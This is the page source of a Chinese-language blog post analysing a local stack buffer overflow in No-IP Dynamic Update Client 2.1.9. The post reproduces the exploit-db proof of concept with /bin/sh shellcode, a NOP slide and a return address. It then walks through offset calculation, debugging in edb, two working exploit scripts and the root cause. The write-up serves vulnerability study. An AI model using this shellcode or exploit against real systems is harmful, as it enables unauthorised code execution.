@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析 | Star</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="缓冲区溢出," />
+  
+
+  <meta name="description" content="溢出原因：对用户输入的 IP 地址没有进行边界检查，导致本地溢出。exploit db POC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析">
+<meta property="og:url" content="http://huirong.github.io/2016/03/28/NoIP-StackOverflow/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="溢出原因：对用户输入的 IP 地址没有进行边界检查，导致本地溢出。exploit db POC">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cmauvlk6j30me0b741s.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cmdujrasj30k601ldg7.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2cmx0k4l1j30kk06utaa.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2coqxiumij30ka0eswkh.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2cox4ej37j30jo09mgn1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cowdm9vqj30jm09o0uf.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2crn7qyqrj30jx0ct79v.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2crrxgenlj30k8051wgb.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx1v6c4tj30jx0cq0xk.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx7qb5d2j30kd06341d.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cxj0ad6bj30k80bujw4.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2cxmgkk1nj30ka0btn1u.jpg">
+<meta property="og:updated_time" content="2016-03-28T14:19:21.459Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析">
+<meta name="twitter:description" content="溢出原因：对用户输入的 IP 地址没有进行边界检查，导致本地溢出。exploit db POC">
+<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/huirong.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016sfsf1fba3xxxx8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#I、实验环境"><span class="toc-text">I、实验环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#II、POC"><span class="toc-text">II、POC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-原POC"><span class="toc-text">① 原POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-POC-分析"><span class="toc-text">② POC 分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③运行-POC"><span class="toc-text">③运行 POC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#III、调试程序"><span class="toc-text">III、调试程序</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-计算返回地址偏移"><span class="toc-text">① 计算返回地址偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-构造-exploit"><span class="toc-text">② 构造 exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、初始-exploit"><span class="toc-text">1、初始 exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、调试程序，定位出错点"><span class="toc-text">2、调试程序，定位出错点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、查看堆"><span class="toc-text">3、查看堆</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IV、漏洞成因"><span class="toc-text">IV、漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-堆的变化"><span class="toc-text">① 堆的变化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-栈的变化"><span class="toc-text">② 栈的变化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-漏洞成因"><span class="toc-text">③ 漏洞成因</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V、参考文献"><span class="toc-text">V、参考文献</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-NoIP-StackOverflow" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2016.03.28</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>star</span>
+        </span>
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://huirong.github.io/2016/03/28/NoIP-StackOverflow/#disqus_thread"></a>
+        </span>
+      
+
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>溢出原因：对用户输入的 IP 地址没有进行边界检查，导致本地溢出。<a href="https://www.exploit-db.com/exploits/25411/" target="_blank" rel="external">exploit db POC</a><br><a id="more"></a></p>
+<h1 id="I、实验环境"><a href="#I、实验环境" class="headerlink" title="I、实验环境"></a>I、实验环境</h1><ul>
+<li>操作系统： kali 3.18.0-kali3-686-pae #1 SMP Debian 3.18.6-1~kali2</li>
+<li>调试工具：edb-debugger</li>
+<li>应用程序：<a href="https://www.exploit-db.com/apps/3b0f5f2ff8637c73ab337be403252a60-noip-duc-linux.tar.gz" target="_blank" rel="external">No-IP</a></li>
+<li>安装教程：<a href="http://www.noip.com/support/knowledgebase/installing-the-linux-dynamic-update-client-on-ubuntu/" target="_blank" rel="external">请参考</a><br><font color="red">Tips：</font> 在安装过程中，需要输入 no ip 账号密码，安装之前，请先前往<a href="https://www.noip.com/" target="_blank" rel="external">官网</a>注册。</li>
+</ul>
+<h1 id="II、POC"><a href="#II、POC" class="headerlink" title="II、POC"></a>II、POC</h1><h2 id="①-原POC"><a href="#①-原POC" class="headerlink" title="① 原POC"></a>① 原POC</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"></div><div class="line">import os</div><div class="line"></div><div class="line">binary = "./noip-2.1.9-1/binaries/noip2-i686"</div><div class="line"></div><div class="line">shellcode = "<span class="symbol">\x</span>eb<span class="symbol">\x</span>1f<span class="symbol">\x</span>5e<span class="symbol">\x</span>89<span class="symbol">\x</span>76<span class="symbol">\x</span>08<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>88<span class="symbol">\x</span>46<span class="symbol">\x</span>07<span class="symbol">\x</span>89<span class="symbol">\x</span>46<span class="symbol">\x</span>0c<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b"\</div><div class="line">            "<span class="symbol">\x</span>89<span class="symbol">\x</span>f3<span class="symbol">\x</span>8d<span class="symbol">\x</span>4e<span class="symbol">\x</span>08<span class="symbol">\x</span>8d<span class="symbol">\x</span>56<span class="symbol">\x</span>0c<span class="symbol">\x</span>cd<span class="symbol">\x</span>80<span class="symbol">\x</span>31<span class="symbol">\x</span>db<span class="symbol">\x</span>89<span class="symbol">\x</span>d8<span class="symbol">\x</span>40<span class="symbol">\x</span>cd"\</div><div class="line">            "<span class="symbol">\x</span>80<span class="symbol">\x</span>e8<span class="symbol">\x</span>dc<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff/bin/sh"</div><div class="line"></div><div class="line">nop = "<span class="symbol">\x</span>90"</div><div class="line">nop_slide = 296 - len(shellcode)</div><div class="line"></div><div class="line"># (gdb) print &amp;IPaddress</div><div class="line"># $2 = (&lt;data variable, no debug info&gt; *) 0x80573bc</div><div class="line">eip_addr = "<span class="symbol">\x</span>bc<span class="symbol">\x</span>73<span class="symbol">\x</span>05<span class="symbol">\x</span>08"</div><div class="line"></div><div class="line">print "[*] Executing <span class="variable">%s ..." %</span> (binary)</div><div class="line"></div><div class="line">os.system("<span class="variable">%s -i %</span>s<span class="variable">%s%</span>s" <span class="variable">% (binary, nop*nop_slide, shellcode, eip_addr))</span></div></pre></td></tr></table></figure>
+<h2 id="②-POC-分析"><a href="#②-POC-分析" class="headerlink" title="② POC 分析"></a>② POC 分析</h2><ul>
+<li>os.system(“%s -i %s%s%s” % (binary, nop*nop_slide, shellcode, eip_addr))<br> 执行命令 ./noip-2.1.9-1/binaries/noip2-i686 -i agrs</li>
+<li>参数：nop<em>nop_slide + shellcode + eip_addr<br> 即 “\x90”</em>251 + shellcode + eip_addr</li>
+</ul>
+<h2 id="③运行-POC"><a href="#③运行-POC" class="headerlink" title="③运行 POC"></a>③运行 POC</h2><p>在 kali 下直接运行 POC：<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg" alt=""><br>说明 shellcode 成功执行。</p>
+<h1 id="III、调试程序"><a href="#III、调试程序" class="headerlink" title="III、调试程序"></a>III、调试程序</h1><h2 id="①-计算返回地址偏移"><a href="#①-计算返回地址偏移" class="headerlink" title="① 计算返回地址偏移"></a>① 计算返回地址偏移</h2><p>推荐使用 pattern.py 脚本进行计算。<br><strong>1、构造唯一字符串</strong><br>命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./pattern<span class="selector-class">.py</span> <span class="number">350</span></div></pre></td></tr></table></figure></p>
+<p>构造长度为 350 的字符串<br><strong>2、使用此参数运行程序</strong><br>命令：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">edb --run ./NO-IP/noip<span class="number">-2.1</span><span class="number">.9</span><span class="number">-1</span>/binaries/noip2-i686 -i <span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al"</span></div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cmauvlk6j30me0b741s.jpg" alt=""><br><strong>3、计算偏移</strong><br>命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pattern<span class="selector-class">.py</span> <span class="number">0</span>x396a4138</div></pre></td></tr></table></figure></p>
+<p>结果<br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cmdujrasj30k601ldg7.jpg" alt=""></p>
+<p>则shellcode可构造为：nops + shellcode + ip_addr，其中 nops + shellcode 长度为 296。</p>
+<h2 id="②-构造-exploit"><a href="#②-构造-exploit" class="headerlink" title="② 构造 exploit"></a>② 构造 exploit</h2><h3 id="1、初始-exploit"><a href="#1、初始-exploit" class="headerlink" title="1、初始 exploit"></a>1、初始 exploit</h3><p>根据上述分析，构造如下 exploit<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2</div><div class="line"></div><div class="line">p = ''</div><div class="line">p += "<span class="symbol">\x</span>90" * 251</div><div class="line">p += "<span class="symbol">\x</span>eb<span class="symbol">\x</span>1f<span class="symbol">\x</span>5e<span class="symbol">\x</span>89<span class="symbol">\x</span>76<span class="symbol">\x</span>08<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>88<span class="symbol">\x</span>46<span class="symbol">\x</span>07<span class="symbol">\x</span>89<span class="symbol">\x</span>46<span class="symbol">\x</span>0c<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b"</div><div class="line">p += "<span class="symbol">\x</span>89<span class="symbol">\x</span>f3<span class="symbol">\x</span>8d<span class="symbol">\x</span>4e<span class="symbol">\x</span>08<span class="symbol">\x</span>8d<span class="symbol">\x</span>56<span class="symbol">\x</span>0c<span class="symbol">\x</span>cd<span class="symbol">\x</span>80<span class="symbol">\x</span>31<span class="symbol">\x</span>db<span class="symbol">\x</span>89<span class="symbol">\x</span>d8<span class="symbol">\x</span>40<span class="symbol">\x</span>cd"</div><div class="line">p += "<span class="symbol">\x</span>80<span class="symbol">\x</span>e8<span class="symbol">\x</span>dc<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff/bin/sh"</div><div class="line"></div><div class="line">p += "aaaa"</div><div class="line"></div><div class="line">print p</div></pre></td></tr></table></figure></p>
+<h3 id="2、调试程序，定位出错点"><a href="#2、调试程序，定位出错点" class="headerlink" title="2、调试程序，定位出错点"></a>2、调试程序，定位出错点</h3><p><strong>（1）、edb 命令：</strong><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">edb --run ./NO-IP/noip<span class="number">-2.1</span><span class="number">.9</span><span class="number">-1</span>/binaries/noip2-i686 -i <span class="string">"`./NO-IP/exploit.py`"</span></div></pre></td></tr></table></figure></p>
+<p><strong>（2）、定位</strong></p>
+<ul>
+<li>F10 运行程序</li>
+<li>F8 一路单步执行程序，直到溢出<br><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2cmx0k4l1j30kk06utaa.jpg" alt=""></li>
+</ul>
+<p>说明，在 0x08049aef 处 call 0x0804bfec 出错</p>
+<p><strong>（3）、继续定位</strong><br>再次使用 edb 命令调试，并在 0x80049aef 处下断点，进入函数内部执行。</p>
+<ul>
+<li>在 0x08049aef 处下断点</li>
+<li>F10 运行程序</li>
+<li>再次 F10 运行到断点处</li>
+<li>F7 进入函数内部</li>
+<li>F8 一路单步执行，直到函数返回前<br> <img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2coqxiumij30ka0eswkh.jpg" alt=""></li>
+</ul>
+<p><strong>（4）、首次试验</strong><br><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2cox4ej37j30jo09mgn1.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cowdm9vqj30jm09o0uf.jpg" alt=""></p>
+<p>才发现，这个程序的栈、堆都是可执行的，简直不能忍！！！！！</p>
+<p>ip_addr 换成 shellcode 起始地址 0xbffff34f。<br>nops(251) + payload + 0xbffff34f<br>可是发现执行出断错。因为执行shellcode之后，程序继续没有正常退出，继续执行，会报错。</p>
+<h3 id="3、查看堆"><a href="#3、查看堆" class="headerlink" title="3、查看堆"></a>3、查看堆</h3><p>既然栈和堆都是可执行的，payload 在栈中，执行不成功，查看堆。<br>原始 POC 中的 ip_addr = 0x080573bc也在堆中，查看此地址附近的堆内容。</p>
+<p><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2crn7qyqrj30jx0ct79v.jpg" alt=""></p>
+<p>ip_addr = 0x080573bc 正好是 shellcode 在堆中的起始地址。</p>
+<p>OK，shellcode 构造好了。<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2</div><div class="line"></div><div class="line">p = ''</div><div class="line">p += "<span class="symbol">\x</span>90" * 251</div><div class="line">p += "<span class="symbol">\x</span>eb<span class="symbol">\x</span>1f<span class="symbol">\x</span>5e<span class="symbol">\x</span>89<span class="symbol">\x</span>76<span class="symbol">\x</span>08<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>88<span class="symbol">\x</span>46<span class="symbol">\x</span>07<span class="symbol">\x</span>89<span class="symbol">\x</span>46<span class="symbol">\x</span>0c<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b"</div><div class="line">p += "<span class="symbol">\x</span>89<span class="symbol">\x</span>f3<span class="symbol">\x</span>8d<span class="symbol">\x</span>4e<span class="symbol">\x</span>08<span class="symbol">\x</span>8d<span class="symbol">\x</span>56<span class="symbol">\x</span>0c<span class="symbol">\x</span>cd<span class="symbol">\x</span>80<span class="symbol">\x</span>31<span class="symbol">\x</span>db<span class="symbol">\x</span>89<span class="symbol">\x</span>d8<span class="symbol">\x</span>40<span class="symbol">\x</span>cd"</div><div class="line">p += "<span class="symbol">\x</span>80<span class="symbol">\x</span>e8<span class="symbol">\x</span>dc<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff/bin/sh"</div><div class="line"></div><div class="line">p += "<span class="symbol">\x</span>bc<span class="symbol">\x</span>73<span class="symbol">\x</span>05<span class="symbol">\x</span>08"</div><div class="line"></div><div class="line">print p</div></pre></td></tr></table></figure></p>
+<p><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f2crrxgenlj30k8051wgb.jpg" alt=""></p>
+<p>分析到此处，对于了解缓冲区溢出的人，都能理解 exploit db 中 POC 的构成了。<br>以下是分析漏洞成因。</p>
+<h1 id="IV、漏洞成因"><a href="#IV、漏洞成因" class="headerlink" title="IV、漏洞成因"></a>IV、漏洞成因</h1><p>堆和栈中都有 shellcode<br>shellcode 在堆中的起始地址：0x080573bc<br>在栈中的起始地址：0xbffff5bc</p>
+<p>在调试程序过程中，一直观察 0x080573bc 和 0xbffff5bc 的变化</p>
+<h2 id="①-堆的变化"><a href="#①-堆的变化" class="headerlink" title="① 堆的变化"></a>① 堆的变化</h2><p>在 0x08049898 处 call 0x08049b65，将 shellcode 拷贝到堆中</p>
+<p><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx1v6c4tj30jx0cq0xk.jpg" alt=""></p>
+<p>call 0x08049b65 之前的 mov 指令是设置参数<br>ebp + 12（0xbffff43c，参数起始地址的地址） 的值存放到 esp + 4<br>ebp + 8 （参数个数）的值存放到 esp </p>
+<p><img src="http://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx7qb5d2j30kd06341d.jpg" alt=""></p>
+<p>栈中查看 0xbffff43c 的值为 0xbffff58d<br>内存中查看 0xbffff58d 处，命令 ./NO-IP/noip-2.1.9-1/binaries/noip2-i686 -i “<code>./NO-IP/exploit.py</code>“ 的起始地址处。</p>
+<p>因此，此代码段的作用是，将命令拷贝到堆 0x080573bc 处。</p>
+<h2 id="②-栈的变化"><a href="#②-栈的变化" class="headerlink" title="② 栈的变化"></a>② 栈的变化</h2><p>在 0x0804c050 处 call 0x08049348，将堆中的 shellcode 拷贝到栈中。</p>
+<p>call 执行之前<br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f2cxj0ad6bj30k80bujw4.jpg" alt=""></p>
+<p>call 执行之后<br><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f2cxmgkk1nj30ka0btn1u.jpg" alt=""></p>
+<p>call 0x08049348 有三个参数，分别存放于 esp,exp+4,esp+8<br>将 exp+4(&amp;ip=%s) 和 esp+8(堆中shellcode的起始地址)  拷贝到栈 0xbffff250 处。</p>
+<h2 id="③-漏洞成因"><a href="#③-漏洞成因" class="headerlink" title="③ 漏洞成因"></a>③ 漏洞成因</h2><ul>
+<li>输入命令 ./NO-IP/noip-2.1.9-1/binaries/noip2-i686 -i “<code>./NO-IP/exploit.py</code>“,没有对参数进行边界检查</li>
+<li>先将整个命令拷贝至堆中</li>
+<li>然后在call 0x08049aef 时，将堆中的命令拷贝至栈中，参数溢出，淹没返回地址。</li>
+</ul>
+<h1 id="V、参考文献"><a href="#V、参考文献" class="headerlink" title="V、参考文献"></a>V、参考文献</h1><p><a href="https://www.exploit-db.com/exploits/25411/" target="_blank" rel="external">No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow</a></p>
+
+    
+  </div>
+</article>
+
+</div>
+
+
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'huirong';
+    
+    var disqus_url = 'http://huirong.github.io/2016/03/28/NoIP-StackOverflow/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//huirong.disqus.com/count.js" async></script>
+
+
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="http://huirong.github.io/2016/03/28/NoIP-StackOverflow/index.html" data-title="No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析" data-url="http://huirong.github.io/2016/03/28/NoIP-StackOverflow/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"star"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
